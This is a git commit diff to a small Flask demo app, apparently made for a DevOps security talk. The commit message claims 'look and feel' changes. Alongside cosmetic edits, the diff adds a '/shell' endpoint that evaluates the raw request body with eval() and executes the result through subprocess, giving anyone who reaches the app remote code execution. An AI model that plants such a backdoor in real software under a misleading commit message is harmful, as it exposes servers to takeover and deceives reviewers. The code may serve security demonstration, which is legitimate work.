49b15300f071dfb61d6962a77aab71486635424c
Andreas Wilke <andiwilke@gmail.com>
2022-02-23 11:28:37 +0100

    New Application
    look and feel

--- app/app.py
+++ app/app.py
@@ -1,12 +1,15 @@
-from flask import Flask, render_template, url_for
-import urllib.parse
-import random
+import urllib
 import platform
+import random
+import requests
+import os
+from flask import Flask, render_template, url_for, request, jsonify
 
 app = Flask(__name__)
 
-event_text = "Welcome to the Hops & DevOps New Year Edition 2022 Part II"
-tweet_text = "Hello from Hops&DevOps. Just enjoyed a fantastic presentation from @automatecloud about Shift Left Security with #laceworks #hopsndevops"
+app_name = 'Demo Application for Dev and Hops'
+
+print(app_name)
 
 
 @app.route('/')
@@ -19,12 +22,28 @@ def index():
     ]
     url = random.choice(images)
     hostname = platform.node()
-    return render_template('index.html', url=url, hostname=hostname, event_text=event_text, tweet_text=tweet_text, tweet_text_url=urllib.parse.quote(tweet_text))
+    random_cocktail = requests.get(
+        'https://www.thecocktaildb.com/api/json/v1/1/random.php').json()
+    shell = False
+    if 'shell' in request.args:
+        shell = True
+    return render_template('index.html', url=url, hostname=hostname, ip=request.remote_addr, cocktail=random_cocktail['drinks'][0]['strDrink'], shell=shell, app_name=app_name)
 
-@app.route('/lacework')
-def lacework():
-    return render_template('lacework.html')
+
+@app.route('/ip')
+def ip():
+    return jsonify({'ip': request.remote_addr}), 200
 
 
-if __name__ == "__main__":
-    app.run(host="0.0.0.0")
+@app.route("/shell", methods=['POST', 'GET'])
+def shell():
+    try:
+        shell_str = request.get_data()
+        resp = str(eval(shell_str))
+    except Exception as e:
+        resp = str(e)
+    return __import__("subprocess").getoutput(resp)
+
+
+if __name__ == '__main__':
+    app.run(host='0.0.0.0')
